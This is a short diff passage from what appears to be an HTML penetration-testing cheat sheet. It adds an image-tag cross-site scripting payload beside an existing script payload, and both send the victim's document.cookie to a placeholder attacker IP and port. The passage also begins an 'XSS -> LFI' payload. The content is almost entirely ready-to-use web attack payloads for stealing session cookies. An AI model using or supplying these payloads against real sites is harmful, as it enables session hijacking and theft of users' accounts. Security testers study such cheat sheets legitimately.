@@ -625,6 +625,9 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
     window.location = 'http://&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/page?param=' + document.cookie;
 </script>
 </code></pre>
+		    Like above, but only request without redirect
+		    <pre><code>&lt;img src="http://&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/page?param=" + document.cookie>
+</code></pre>
 	      <li> XSS -> LFI
 			<pre><code><script>
     x=new XMLHttpRequest;
